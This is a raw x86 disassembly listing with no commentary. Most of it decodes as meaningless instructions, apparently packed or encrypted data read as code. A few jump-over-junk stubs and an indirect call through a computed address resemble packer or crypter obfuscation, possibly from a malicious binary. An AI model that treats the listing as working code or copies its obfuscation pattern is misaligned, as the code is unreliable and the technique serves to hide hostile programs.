  40405a:	sub    BYTE PTR [eax-0x75e616b1],bl
  404060:	sub    eax,0x690f921a
  404065:	daa    
  404066:	push   eax
  404067:	stos   DWORD PTR es:[edi],eax
  404068:	xchg   edx,eax
  404069:	lods   al,BYTE PTR ds:[esi]
  40406a:	xor    bl,BYTE PTR [esp+eiz*4+0x1a]
  40406e:	scas   al,BYTE PTR es:[edi]
  40406f:	push   0x1b
  404071:	xchg   ebx,eax
  404072:	into   
  404073:	dec    ecx
  404074:	push   ecx
  404075:	test   BYTE PTR [ebx],bh
  404077:	cdq    
  404078:	jl     0x4040ae
  40407a:	stc    
  40407b:	arpl   WORD PTR [esi+0x6e],sp
  40407e:	popa   
  40407f:	je     0x4040b3
  404081:	pop    ecx
  404082:	xchg   esi,eax
  404083:	mov    esp,0xb9868f71
  404088:	ss int 0x2b
  40408b:	xlat   BYTE PTR ds:[ebx]
  40408c:	cmp    bl,BYTE PTR [esi+ebx*1]
  40408f:	jmp    0x4040b1
  404091:	pusha  
  404092:	adc    bl,BYTE PTR [ebp+0x52887554]
  404098:	cmp    al,0xee
  40409a:	push   esp
  40409b:	add    edi,eax
  40409d:	sbb    al,0xd4
  40409f:	aad    0x86
  4040a1:	xchg   edx,eax
  4040a2:	push   edi
  4040a3:	xor    al,0xdb
  4040a5:	push   edi
  4040a6:	inc    eax
  4040a7:	sub    BYTE PTR [edi*4+0xd0a6215],0xd5
  4040af:	pusha  
  4040b0:	pop    edx
  4040b1:	mov    al,ds:0x7b5e3922
  4040b6:	inc    eax
  4040b7:	cld    
  4040b8:	lahf   
  4040b9:	cmp    BYTE PTR fs:[edi-0x4a],al
  4040bd:	enter  0xe312,0x60
  4040c1:	push   ebp
  4040c2:	pop    ebx
  4040c3:	(bad)  
  4040c5:	inc    esp
  4040c6:	sub    eax,0x54f8163a
  4040cb:	rcr    DWORD PTR [ebx-0x70fc29fb],0xfa
  4040d2:	and    BYTE PTR [edx+edi*1+0x37],bl
  4040d6:	mov    ch,0xf6
  4040d8:	inc    ebp
  4040d9:	cmc    
  4040da:	aas    
  4040db:	mov    edx,0x5503f26b
  4040e0:	mov    ah,0xe2
  4040e2:	dec    eax
  4040e3:	pusha  
  4040e4:	mov    ss,WORD PTR ds:0x9f6621b
  4040ea:	nop
  4040eb:	push   0x4b
  4040ed:	int3   
  4040ee:	std    
  4040ef:	int3   
  4040f0:	das    
  4040f1:	jns    0x4040b5
  4040f3:	pop    ecx
  4040f4:	adc    edx,eax
  4040f6:	inc    ebx
  4040f7:	adc    eax,0xee016433
  4040fc:	pop    edx
  4040fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040fe:	lods   al,BYTE PTR ds:[esi]
  4040ff:	pop    edx
  404100:	mov    ebp,0xd8683ec0
  404105:	add    eax,0x563bdad
  40410a:	mov    edi,0x9732cf4a
  40410f:	sahf   
  404110:	mov    ss,WORD PTR [edi+0x20]
  404113:	pop    ecx
  404114:	fwait
  404115:	and    esp,esi
  404117:	adc    al,0xa0
  404119:	xor    edx,ebp
  40411b:	mov    edi,edx
  40411d:	xchg   DWORD PTR [edi+0x41],ebx
  404120:	jle    0x404159
  404122:	popa   
  404123:	shr    DWORD PTR [esi],0xd2
  404126:	push   cs
  404127:	lods   eax,DWORD PTR ds:[esi]
  404128:	jae    0x4040d2
  40412a:	lock int3 
  40412c:	push   eax
  40412d:	in     eax,0x13
  40412f:	lock ror esp,0x8
  404133:	jo     0x4041b1
  404135:	cmp    bl,ah
  404137:	imul   DWORD PTR [ebp-0x4c7d348b]
  40413d:	or     DWORD PTR [ecx+0x47],eax
  404140:	sub    ebx,DWORD PTR ds:0x7abefda6
  404146:	arpl   WORD PTR [edi],dx
  404148:	adc    DWORD PTR gs:[esi],edx
  40414b:	add    dh,dh
  40414d:	add    ah,cl
  40414f:	push   cs
  404150:	test   DWORD PTR [esi-0x6c61f4b7],0x635c2a73
  40415a:	and    edi,edx
  40415c:	js     0x4040e5
  40415e:	dec    edi
  40415f:	sbb    ecx,DWORD PTR [ecx]
  404161:	cld    
  404162:	ins    DWORD PTR es:[edi],dx
  404163:	clc    
  404164:	fcomp  QWORD PTR [ecx+0x4f9def9b]
  40416a:	cli    
  40416b:	shl    DWORD PTR [eax+0x6],cl
  40416e:	ret    
  40416f:	xchg   esi,eax
  404170:	ins    BYTE PTR es:[edi],dx
  404171:	add    esp,DWORD PTR [ecx]
  404173:	stc    
  404174:	and    BYTE PTR [edx+ecx*4+0x539ce687],bh
  40417b:	jge    0x40412a
  40417d:	outs   dx,BYTE PTR ds:[esi]
  40417e:	mov    dl,0x1f
  404180:	push   eax
  404181:	lea    eax,ds:0x209d7c4a
  404187:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  404189:	jno    0x404179
  40418b:	sbb    BYTE PTR [esi+0x685c7342],bl
  404191:	nop
  404192:	mov    ch,0xca
  404194:	dec    edi
  404195:	mov    WORD PTR [ebx-0x484b7dc1],?
  40419b:	and    eax,0xdcaf3216
  4041a0:	or     edx,DWORD PTR [esi-0x59]
  4041a3:	cdq    
  4041a4:	daa    
  4041a5:	(bad)  
  4041a7:	aas    
  4041a8:	push   ecx
  4041a9:	(bad)  
  4041ab:	push   cs
  4041ac:	push   ss
  4041ad:	pop    esp
  4041ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041af:	clc    
  4041b0:	inc    edx
  4041b1:	xchg   BYTE PTR [ebp+0x51],dl
  4041b4:	leave  
  4041b5:	in     al,0xd1
  4041b7:	call   0x9a13d118
  4041bc:	call   0x1cb6:0xcaa15551
  4041c3:	pop    esi
  4041c4:	aad    0xcc
  4041c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041c7:	cwde   
  4041c8:	bswap  esi
  4041ca:	in     al,dx
  4041cb:	aad    0x2d
  4041cd:	es stc 
  4041cf:	dec    ebp
  4041d0:	mov    ah,0x1c
  4041d2:	mov    esi,0x9486f37d
  4041d7:	mov    ch,0x2a
  4041d9:	cmc    
  4041da:	xchg   edx,eax
  4041db:	push   ebx
  4041dc:	cmp    eax,0x953cd831
  4041e1:	test   ebp,ebp
  4041e3:	ins    DWORD PTR es:[edi],dx
  4041e4:	pushf  
  4041e5:	push   ss
  4041e6:	sub    eax,0x5ddb5a30
  4041eb:	or     eax,0x17dbb427
  4041f0:	inc    edi
  4041f1:	imul   eax,DWORD PTR [esp+ebp*8-0x20],0xffffff81
  4041f6:	inc    ecx
  4041f7:	mov    cr6,ebp
  4041fa:	in     eax,0xc6
  4041fc:	push   ds
  4041fd:	sbb    DWORD PTR [ebx],0xf1bc2cdf
  404203:	mov    edi,?
  404205:	cmc    
  404206:	push   ss
  404207:	pop    eax
  404208:	(bad)  
  404209:	cmp    esi,eax
  40420b:	mov    cl,0xb
  40420d:	aaa    
  40420e:	ins    DWORD PTR es:[edi],dx
  40420f:	xchg   ecx,edx
  404211:	dec    BYTE PTR [edx]
  404213:	push   DWORD PTR [ebp-0x18]
  404216:	mov    eax,ds:0x413c9a
  40421b:	mov    eax,DWORD PTR [eax]
  40421d:	push   DWORD PTR [eax]
  40421f:	lea    eax,ds:0x413cb6
  404225:	push   DWORD PTR [eax]
  404227:	lea    eax,ds:0x413a62
  40422d:	push   DWORD PTR [eax]
  40422f:	lea    eax,ds:0x413c96
  404235:	jmp    0x404643
  40423a:	out    0xed,eax
  40423c:	sahf   
  40423d:	(bad)  
  40423e:	mov    ah,0x55
  404240:	addr16 in eax,dx
  404242:	push   edi
  404243:	sub    DWORD PTR [bx+si-0x54],0xffffffd2
  404248:	shr    BYTE PTR [edx-0x2b],cl
  40424b:	and    eax,0x7d6f7e7e
  404250:	jle    0x4042d0
  404252:	mov    ah,BYTE PTR [ebx+0x2edfd72]
  404258:	sar    BYTE PTR [ebx+0x63],1
  40425b:	cdq    
  40425c:	imul   eax,DWORD PTR [eax+edx*2-0x39],0xa8acecfe
  404264:	std    
  404265:	inc    eax
  404266:	add    dl,BYTE PTR [ebx-0x615097a7]
  40426c:	data16 std 
  40426e:	xor    al,0x3c
  404270:	jne    0x4041f2
  404272:	jns    0x4042c2
  404274:	mov    al,ds:0xf334a336
  404279:	pop    ecx
  40427a:	xor    DWORD PTR fs:0xda5d2cbd,edi
  404281:	cmovo  ebx,DWORD PTR [edx]
  404284:	mov    ah,0x12
  404286:	pop    ebp
  404287:	mov    al,ds:0xa15e18a0
  40428c:	cdq    
  40428d:	xchg   ebp,eax
  40428e:	imul   edi,DWORD PTR [ebp-0x30763094],0x5baea848
  404298:	xchg   ebx,eax
  404299:	pop    ds
  40429a:	xchg   edx,eax
  40429b:	inc    esp
  40429c:	retf   0x5c16
  40429f:	sub    eax,0x116f370d
  4042a4:	inc    edx
  4042a5:	lods   eax,DWORD PTR es:[esi]
  4042a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042a8:	adc    eax,0x4e002d7a
  4042ad:	and    eax,0x4861aba1
  4042b2:	pushf  
  4042b3:	nop
  4042b4:	pop    es
  4042b5:	and    ebp,DWORD PTR [esi]
  4042b7:	dec    ebp
  4042b8:	cli    
  4042b9:	pop    ds
  4042ba:	sub    al,0x7e
  4042bc:	cmp    BYTE PTR [edi+0x250b696a],dh
  4042c2:	(bad)  
  4042c3:	push   0x9d1ef3f
  4042c8:	inc    edx
  4042c9:	push   es
  4042ca:	rcr    BYTE PTR [edi-0x3f4d4799],cl
  4042d0:	push   0x2e8b931d
  4042d5:	sub    bh,BYTE PTR [eax+eax*2-0x650d1fe0]
  4042dc:	test   ecx,0x915f46c3
  4042e2:	xchg   DWORD PTR [eax+eiz*1],ebp
  4042e5:	inc    eax
  4042e6:	cdq    
  4042e7:	xchg   esi,eax
  4042e8:	sbb    bh,BYTE PTR [edi]
  4042ea:	jns    0x40435b
  4042ec:	adc    dl,cl
  4042ee:	sub    eax,0xc34f21d1
  4042f3:	repnz inc ebp
  4042f5:	sbb    ch,ch
  4042f7:	mov    ch,0xfd
  4042f9:	xor    dh,dl
  4042fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042fc:	or     ah,BYTE PTR [edi+0x22d00f7a]
  404302:	inc    esi
  404303:	iret   
  404304:	cli    
  404305:	xlat   BYTE PTR ds:[ebx]
  404306:	adc    BYTE PTR [eax+edx*1-0x8684e6a],0x90
  40430e:	adc    DWORD PTR [edi-0x57],eax
  404311:	sub    ch,dl
  404313:	adc    al,0x21
  404315:	and    al,BYTE PTR [eax-0x14f209a9]
  40431b:	pop    esp
  40431c:	mov    ds:0xa2dc2669,al
  404321:	and    BYTE PTR [esi],bh
  404323:	repz test eax,0x9a2ab199
  404329:	data16 xor al,0x98
  40432c:	popa   
  40432d:	xor    eax,0xb3bbeb38
  404332:	mov    edx,edi
  404334:	dec    esi
  404335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404336:	mov    ah,0x73
  404338:	loopne 0x404306
  40433a:	ror    DWORD PTR [eax+0x75],0x41
  40433e:	call   0x781c:0x872e13b5
  404345:	(bad)
  40434a:	out    0x41,eax
  40434c:	inc    ebx
  40434d:	sub    eax,DWORD PTR [esi+0xa7abed4]
  404353:	imul   edi,DWORD PTR [esi],0x2d23c837
  404359:	fst    st(2)
  40435b:	or     al,0xbb
  40435d:	in     al,dx
  40435e:	shl    DWORD PTR [ecx],0x9c
  404361:	lock and DWORD PTR [esi-0x73],ecx
  404365:	nop
  404366:	or     BYTE PTR [ebp-0x5fc87ce7],al
  40436c:	inc    edx
  40436d:	mov    eax,0xbfd30f42
  404372:	imul   edx,DWORD PTR [ebx+0x7c],0x6f898d54
  404379:	push   cs
  40437a:	jo     0x4043ac
  40437c:	xchg   cl,bh
  40437e:	popf   
  40437f:	xor    cl,BYTE PTR [ecx+0x6a1c6e3c]
  404385:	mov    cl,0xc7
  404387:	cmp    eax,0x66911835
  40438c:	popa   
  40438d:	push   edx
  40438e:	mov    ecx,0x341990f
  404393:	test   ah,0xdf
  404396:	mov    esp,0xe2ddaa50
  40439b:	inc    DWORD PTR [ebx-0x25]
  40439e:	pop    esi
  40439f:	push   edi
  4043a0:	push   DWORD PTR [ebx+0x13]
  4043a3:	pop    ebx
  4043a4:	lods   eax,DWORD PTR ds:[esi]
  4043a5:	jno    0x4043ce
  4043a7:	adc    eax,0xf7547f48
  4043ac:	xlat   BYTE PTR ds:[ebx]
  4043ad:	dec    ecx
  4043ae:	jge    0x404384
  4043b0:	test   DWORD PTR [eax-0x649fc7ef],ecx
  4043b6:	aam    0x52
  4043b8:	leave  
  4043b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043ba:	add    bh,BYTE PTR ss:[esp+ebp*1-0x24184ba]
  4043c2:	mov    ebp,0x2929d2ce
  4043c7:	cwde   
  4043c8:	aad    0xe7
  4043ca:	cmp    DWORD PTR [ecx],0xffffff82
  4043cd:	inc    ecx
  4043ce:	iret   
  4043cf:	dec    eax
  4043d0:	loopne 0x404378
  4043d2:	mov    ebx,0xb4aadec1
  4043d7:	fwait
  4043d8:	adc    BYTE PTR [edx+0x63d6e22b],ch
  4043de:	sub    eax,0x8e0e8af8
  4043e3:	bound  ebp,QWORD PTR [eax]
  4043e5:	lahf   
  4043e6:	cmp    ebp,DWORD PTR [eax+edx*1+0x21d7da49]
  4043ed:	pop    esi
  4043ee:	data16 fild WORD PTR ds:0xb32d5b84
  4043f5:	mov    ebx,0x4635e1f4
  4043fa:	inc    edi
  4043fb:	adc    eax,0x416c2a2a
  404400:	xchg   BYTE PTR es:[edi+0x691fffc0],cl
  404407:	pop    ss
  404408:	out    0x71,al
  40440a:	popf   
  40440b:	(bad)  
  40440d:	push   ebx
  40440e:	and    al,0x44
  404410:	hlt    
  404411:	pop    edi
  404412:	repnz int3 
  404414:	mov    fs,WORD PTR [esi]
  404416:	mov    al,ds:0xfbb75f79
  40441b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40441c:	push   eax
  40441d:	outs   dx,DWORD PTR ds:[esi]
  40441e:	mov    al,0x2f
  404420:	sbb    edi,DWORD PTR [ebp-0x762722dd]
  404426:	push   ebp
  404427:	mov    dh,0x36
  404429:	popa   
  40442a:	jmp    0x40446f
  40442c:	pushf  
  40442d:	pop    esi
  40442e:	xchg   DWORD PTR [edi-0x684d240b],ebx
  404434:	and    DWORD PTR [edx-0x4fb16660],edx
  40443a:	add    edx,DWORD PTR [edx-0x62]
  40443d:	shr    DWORD PTR [ebx+0x794f46ec],0x90
  404444:	xor    eax,0xb04c8bbb
  404449:	push   ds
  40444a:	mov    al,0xbf
  40444c:	retf   
  40444d:	sbb    esp,0x2a3ac708
  404453:	leave  
  404454:	mov    eax,ds:0xe49d86d9
  404459:	daa    
  40445a:	stc    
  40445b:	fadd   QWORD PTR [esp+edx*4+0x25]
  40445f:	push   edi
  404460:	and    BYTE PTR [ebx+eiz*8+0x5d896b7b],0x52
  404468:	inc    ebp
  404469:	popa   
  40446a:	shl    al,cl
  40446c:	int3   
  40446d:	mov    cl,0x18
  40446f:	mov    bl,0x7b
  404471:	xor    al,0x90
  404473:	lea    ecx,[ebp-0x42]
  404476:	std    
  404477:	adc    eax,0x805bed0e
  40447c:	add    DWORD PTR ds:0x8201f145,esi
  404482:	repz mov ebp,0x7617d19
  404488:	fwait
  404489:	mov    edx,0x3b1f2cb7
  40448e:	mov    bh,BYTE PTR [eax+0x1b]
  404491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404492:	mov    ss,edi
  404494:	scas   al,BYTE PTR es:[edi]
  404495:	push   eax
  404496:	cmc    
  404497:	or     BYTE PTR [edx+0x7d8197f3],0xcd
  40449e:	rcl    DWORD PTR [edi+ebx*1],cl
  4044a1:	xchg   edi,eax
  4044a2:	loope  0x404439
  4044a4:	sub    DWORD PTR [ebp+0x57],0x7b873d3b
  4044ab:	push   0x5ac08eae
  4044b0:	and    eax,0x54359b4f
  4044b5:	test   al,0x78
  4044b7:	cmp    eax,DWORD PTR [ebp+0x55]
  4044ba:	addr16 ret 0xc918
  4044be:	sbb    BYTE PTR [ecx],al
  4044c0:	xchg   edi,eax
  4044c1:	rol    BYTE PTR [esi+0x46],0x90
  4044c5:	jg     0x404509
  4044c7:	call   0xf4d8:0x11b740fc
  4044ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044cf:	jle    0x404544
  4044d1:	test   DWORD PTR fs:[edx-0x5c2fc76d],edi
  4044d8:	jne    0x40448a
  4044da:	(bad)  
  4044db:	stc    
  4044dc:	add    al,0xfc
  4044de:	inc    edx
  4044df:	or     cl,BYTE PTR [edi]
  4044e1:	sbb    eax,DWORD PTR [ebp+esi*4-0x12]
  4044e5:	(bad)  [edx+0x4e9f4f41]
  4044eb:	add    al,0xc6
  4044ed:	sub    bh,BYTE PTR [ebx]
  4044ef:	dec    esi
  4044f0:	xchg   edx,eax
  4044f1:	rsm    
  4044f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044f4:	test   ecx,ecx
  4044f6:	mov    eax,0xdeef4c43
  4044fb:	test   DWORD PTR cs:[edi],ecx
  4044fe:	inc    eax
  4044ff:	jmp    FWORD PTR [edi-0x666c12cd]
  404505:	and    al,0x88
  404507:	fistp  DWORD PTR [ebx+0x1c7342bd]
  40450d:	test   DWORD PTR [ebx+0x29],edx
  404510:	js     0x40453a
  404512:	int3   
  404513:	cmc    
  404514:	pop    eax
  404515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404516:	fiadd  DWORD PTR [ebx]
  404518:	dec    ebp
  404519:	stos   BYTE PTR es:[edi],al
  40451a:	jno    0x4044bc
  40451c:	jne    0x40458a
  40451e:	ret    
  40451f:	int3   
  404520:	sub    DWORD PTR [ebp+0x6445f535],edi
  404526:	daa    
  404527:	scas   al,BYTE PTR es:[edi]
  404528:	imul   eax,DWORD PTR [ebp-0x19f3c2aa],0x4e
  40452f:	mov    esi,0xcd2e077c
  404534:	or     BYTE PTR ds:0xe79bb7fd,dh
  40453a:	jne    0x404522
  40453c:	mov    esi,0x8a6e6a01
  404541:	in     eax,0xd1
  404543:	int3   
  404544:	subps  xmm1,XMMWORD PTR [ebp-0x1fb62624]
  40454b:	pop    ebp
  40454c:	dec    ebx
  40454d:	ja     0x404512
  40454f:	fdiv   DWORD PTR [esi-0x53343d17]
  404555:	dec    edi
  404556:	rcr    esi,cl
  404558:	push   0x2c0046b
  40455d:	fst    QWORD PTR [esp+esi*2+0x4f]
  404561:	jns    0x404513
  404563:	fwait
  404564:	iret   
  404565:	imul   edi,DWORD PTR [ecx-0x53f8f2fe],0xd43d10b1
  40456f:	inc    ebx
  404570:	xor    BYTE PTR [edi-0x5],bl
  404573:	test   BYTE PTR [ebx],al
  404575:	adc    dh,0x26
  404578:	pop    ecx
  404579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40457a:	mul    DWORD PTR [ebx-0x5a]
  40457d:	in     eax,dx
  40457e:	daa    
  40457f:	pop    ecx
  404580:	es sahf 
  404582:	jmp    0x6a7d3e0a
  404587:	repnz push ecx
  404589:	and    eax,edi
  40458b:	cmp    ecx,0x56
  40458e:	sub    eax,0x2abcff72
  404593:	or     dl,BYTE PTR [eax+0x7bb6ccdb]
  404599:	icebp  
  40459a:	lods   eax,DWORD PTR ds:[esi]
  40459b:	jno    0x404611
  40459d:	cmp    ah,ch
  40459f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045a0:	mov    bh,0x18
  4045a2:	frstor [ebp-0x5]
  4045a5:	mov    bl,0x54
  4045a7:	hlt    
  4045a8:	sub    DWORD PTR [edi-0x5d7dd631],ebp
  4045ae:	jo     0x4045f2
  4045b0:	pop    esp
  4045b1:	xchg   esi,eax
  4045b2:	jns    0x404599
  4045b4:	sub    esi,DWORD PTR [edx-0x4421678a]
  4045ba:	mov    WORD PTR [ecx-0x5d],es
  4045bd:	iret   
  4045be:	mov    DWORD PTR [ebx],ecx
  4045c0:	mov    dh,0x95
  4045c2:	ds inc esp
  4045c4:	and    BYTE PTR [eax],ch
  4045c6:	sub    DWORD PTR [esi-0x5a],0x42
  4045ca:	add    eax,DWORD PTR ds:0x1cba7d3b
  4045d0:	pop    ecx
  4045d1:	out    0x10,eax
  4045d3:	arpl   WORD PTR [ebx],ax
  4045d5:	dec    esp
  4045d6:	jp     0x4045cd
  4045d8:	mov    ebp,0xb0cab8c5
  4045dd:	mul    DWORD PTR [ebx+0x4]
  4045e0:	stos   DWORD PTR es:[edi],eax
  4045e1:	pop    eax
  4045e2:	mov    ecx,edi
  4045e4:	xchg   ebp,eax
  4045e5:	xchg   ecx,eax
  4045e6:	cli    
  4045e7:	adc    dl,0xb1
  4045ea:	mov    WORD PTR [edx+0x46],gs
  4045ed:	xor    dh,cl
  4045ef:	out    0x15,al
  4045f1:	jl     0x40461e
  4045f3:	xchg   edx,eax
  4045f4:	jno    0x4045d9
  4045f6:	dec    eax
  4045f7:	test   eax,0x50fc975
  4045fc:	ret    0x24ff
  4045ff:	ds sbb al,0x21
  404602:	ret    0x2269
  404605:	repnz dec edi
  404607:	loop   0x404654
  404609:	jl     0x4045ea
  40460b:	arpl   WORD PTR [edx+edi*8+0x42bf10fc],bx
  404612:	mov    esi,0xd9e238c1
  404617:	out    0x19,al
  404619:	out    dx,eax
  40461a:	rcl    ah,1
  40461c:	xlat   BYTE PTR ds:[ebx]
  40461d:	fs pop ds
  40461f:	imul   edx,DWORD PTR [ecx+0x34fd0f36],0x9167d5c0
  404629:	mov    BYTE PTR [esp+esi*1],ah
  40462c:	bound  edx,QWORD PTR [esi-0x5c]
  40462f:	js     0x404683
  404631:	test   eax,0x198b1a
  404636:	popf   
  404637:	jmp    0xbf3ef45c
  40463c:	cli    
  40463d:	jns    0x404690
  40463f:	pop    es
  404640:	sub    ah,BYTE PTR [ecx+esi*2]
  404643:	push   DWORD PTR [eax]
  404645:	lea    eax,ds:0x413dc2
  40464b:	push   DWORD PTR [eax]
  40464d:	xchg   ebx,edx
  40464f:	inc    ebx
  404650:	inc    ebx
  404651:	push   ebx
  404652:	pop    eax
  404653:	call   DWORD PTR [eax-0x2]
  404656:	mov    eax,DWORD PTR [ebp-0x38]
  404659:	mov    ecx,DWORD PTR ds:0x413c5a
  40465f:	add    DWORD PTR [eax],ecx
  404661:	jmp    0x404a6f
  404666:	xor    DWORD PTR ds:0xb112a30a,ebx
  40466c:	mov    cl,0xad
  40466e:	jne    0x404697
  404670:	xor    eax,0x4bce2be3
  404675:	stos   BYTE PTR es:[edi],al
  404676:	ret    0x7e21
  404679:	jle    0x4046ea
  40467b:	jge    0x4046fb
  40467d:	jle    0x40464d
  40467f:	xor    BYTE PTR [edx-0x7c],0x42
  404683:	lea    ebp,[ebx+0x73cba5f3]
  404689:	retf   0x7538
  40468c:	cmp    eax,0x800b598c
  404691:	shr    eax,0x8f
  404694:	scas   eax,DWORD PTR es:[edi]
  404695:	adc    al,0xc2
  404697:	pop    ebx
  404698:	mov    ds,esi
  40469a:	stc    
  40469b:	dec    ebp
  40469c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40469d:	jecxz  0x4046f6
  40469f:	push   edx
  4046a0:	sbb    esi,eax
  4046a2:	fldenv ds:0x9455d76d
  4046a8:	into   
  4046a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046aa:	jmp    0x4046ed
  4046ac:	xor    eax,0x362ca0cc
  4046b1:	push   ds
  4046b2:	jb     0x40472f
  4046b4:	adc    eax,0x6067d7cb
  4046b9:	test   DWORD PTR [ebx-0x5],ebx
  4046bc:	add    eax,0x78dee9d4
  4046c1:	cwde   
  4046c2:	push   ss
  4046c3:	add    dh,BYTE PTR [esi-0x75]
  4046c6:	in     al,dx
  4046c7:	cli    
  4046c8:	pusha  
  4046c9:	fnstsw WORD PTR [edx]
  4046cb:	xchg   esp,eax
  4046cc:	(bad)  
  4046cd:	and    DWORD PTR [edx+edi*8+0x28],ebp
  4046d1:	std    
  4046d2:	rol    DWORD PTR [edi+0x3b9000cc],0xa1
  4046d9:	inc    edi
  4046da:	cmc    
  4046db:	sub    BYTE PTR [edi],0x9d
  4046de:	int    0x7a
  4046e0:	imul   edi,DWORD PTR [edx+0x4f],0xffffffdf
  4046e4:	sbb    eax,0x7c658ce9
  4046e9:	adc    ah,BYTE PTR [eax+0xc]
  4046ec:	daa    
  4046ed:	retf   0xac0e
  4046f0:	mov    ?,eax
  4046f2:	std    
  4046f3:	(bad)
  4046f6:	add    eax,0xfc26770f
  4046fb:	push   es
  4046fc:	mov    bl,0x45
  4046fe:	fidiv  WORD PTR [eax+esi*4]
  404701:	adc    al,0xf8
  404703:	push   esi
  404704:	(bad)  
  404705:	cli    
  404706:	xchg   esp,eax
  404707:	and    esp,DWORD PTR [ebx]
  404709:	mov    bl,0x1c
  40470b:	sbb    al,0x79
  40470d:	jno    0x4046e3
  40470f:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  404711:	jnp    0x4046f6
  404713:	mov    dl,0xcf
  404715:	fdiv   DWORD PTR [edx]
  404717:	clc    
  404718:	shr    dh,0xe6
  40471b:	jg     0x4046e3
  40471d:	adc    dl,dh
  40471f:	clc    
  404720:	dec    esi
  404721:	fisttp WORD PTR [edi+0x2c5f95fb]
  404727:	inc    edi
  404728:	and    BYTE PTR [edx+0x4f],al
  40472b:	test   dx,si
  40472e:	fstp   QWORD PTR [eax-0x56]
  404731:	pushf  
  404732:	push   ebp
  404733:	test   BYTE PTR [edx+eax*4+0x70],bl
  404737:	push   ss
  404738:	pop    ebp
  404739:	xor    al,0x7a
  40473b:	sbb    al,0xbd
  40473d:	adc    dl,dl
  40473f:	lea    eax,[ebp-0x68]
  404742:	add    eax,0x9d7f3eb7
  404747:	push   edi
  404748:	dec    eax
  404749:	jbe    0x4046ed
  40474b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40474c:	(bad)  
  40474d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40474e:	ret    
  40474f:	jns    0x404762
  404751:	addr16 or eax,0x1525f1de
  404757:	mov    ecx,DWORD PTR [ecx+0x4c8d495e]
  40475d:	dec    edx
  40475e:	mov    ebx,0xa4a758cf
  404763:	shr    DWORD PTR [di-0x6d65],1
  404768:	xchg   BYTE PTR ds:0x23b44c62,bh
  40476e:	dec    edi
  40476f:	lods   al,BYTE PTR ds:[esi]
  404770:	loopne 0x404764
  404772:	rol    DWORD PTR [ecx-0x21c872be],cl
  404778:	test   al,0xd2
  40477a:	jno    0x4047af
  40477c:	sbb    al,0x71
  40477e:	ja     0x404746
  404780:	push   edx
  404781:	ds sbb al,0x91
  404784:	xor    BYTE PTR [eax+0x2b98c56],al
  40478a:	push   esp
  40478b:	ror    BYTE PTR [eax],0xb5
  40478e:	inc    ebx
  40478f:	adc    al,0xcf
  404791:	sub    al,BYTE PTR [eax-0x65]
  404794:	jo     0x404794
  404796:	mov    esi,0xc1d8696c
  40479b:	inc    ebp
  40479c:	xchg   edi,eax
  40479e:	pop    ds
  40479f:	iret   
  4047a0:	aam    0xb1
  4047a2:	int    0x66
  4047a4:	icebp  
  4047a5:	adc    ebx,esi
  4047a7:	dec    esp
  4047a8:	das    
  4047a9:	mov    ch,0xa4
  4047ab:	aad    0xd
  4047ad:	xor    DWORD PTR [ebx+0x4c4ca2e2],edx
  4047b3:	sub    BYTE PTR [edi+0xaa97231],bl
  4047b9:	and    BYTE PTR [esi-0x7f],0x93
  4047bd:	jae    0x40482d
  4047bf:	scas   eax,DWORD PTR es:[edi]
  4047c0:	pop    ds
  4047c1:	add    dh,bh
  4047c3:	xor    ch,bl
  4047c5:	sbb    al,BYTE PTR [ebx+0x1d]
  4047c8:	xor    DWORD PTR [edi],ebp
  4047ca:	mov    DWORD PTR [edx],edi
  4047cc:	sti    
  4047cd:	out    0x20,eax
  4047cf:	repz pusha 
  4047d1:	stos   BYTE PTR es:[edi],al
  4047d2:	push   cs
  4047d3:	sti    
  4047d4:	loopne 0x404822
  4047d6:	ret    
  4047d7:	ficomp DWORD PTR [edx]
  4047d9:	mov    edi,0xffc56d28
  4047de:	sbb    edi,edi
  4047e0:	dec    esi
  4047e1:	xchg   edx,eax
  4047e2:	sbb    BYTE PTR [ecx-0x62],cl
  4047e5:	mov    DWORD PTR [ebp*2-0x43968d3f],ebp
  4047ec:	jbe    0x40486a
  4047ee:	xchg   edi,eax
  4047ef:	xor    DWORD PTR [ebp-0x1],ebp
  4047f2:	cdq    
  4047f3:	inc    esp
  4047f4:	in     al,dx
  4047f5:	ror    ch,cl
  4047f7:	cmp    DWORD PTR ds:0x834dda3a,edi
  4047fd:	dec    edi
  4047fe:	sub    al,0xf8
  404800:	outs   dx,DWORD PTR ds:[esi]
  404801:	mov    gs,WORD PTR [eax-0x7d]
  404804:	test   edi,ebx
  404806:	in     eax,0x2c
  404808:	cs scas eax,DWORD PTR es:[edi]
  40480a:	imul   ebx,DWORD PTR [eax+ebx*2-0x6f],0x11
  40480f:	mov    cl,0x9b
  404811:	sahf   
  404812:	sub    eax,0x51bf9bd3
  404817:	dec    ebx
  404818:	cs in  al,dx
  40481a:	ja     0x40479e
  40481c:	cwde   
  40481d:	iret   
  40481e:	sahf   
  40481f:	ror    DWORD PTR ds:[ebp-0x5b],1
  404823:	xchg   BYTE PTR ds:0x476a74bb,al
  404829:	scas   al,BYTE PTR es:[edi]
  40482a:	mov    bl,0xde
  40482c:	push   ss
  40482d:	push   edx
  40482e:	cwde   
  40482f:	les    edi,FWORD PTR ds:0x95bf527a
  404835:	inc    esi
  404836:	jns    0x40489d
  404838:	sub    ebp,DWORD PTR [eax+0x549823c0]
  40483e:	leave  
